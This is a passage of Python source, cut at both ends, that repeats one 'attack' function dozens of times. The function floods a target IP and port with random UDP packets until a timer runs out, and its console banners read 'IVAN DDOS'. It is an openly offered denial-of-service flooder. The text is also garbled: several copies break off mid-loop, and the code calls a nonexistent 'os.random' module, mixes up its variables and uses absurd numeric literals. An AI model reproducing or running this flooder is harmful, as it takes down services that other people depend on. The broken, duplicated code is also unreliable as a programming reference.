        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
